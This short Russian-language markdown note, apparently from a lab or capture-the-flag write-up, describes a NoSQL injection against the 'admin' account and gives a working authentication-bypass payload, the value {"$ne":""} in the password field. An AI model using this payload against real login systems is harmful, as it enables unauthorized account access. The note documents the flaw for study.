# NoSQL Injection

* Атака проводится на пользователя `admin`.
* Поле `password` уязвимо к NoSQL-инъкции. 

### Пример успешного проведения атаки:
```
username: admin
password: {"$ne":""}
```
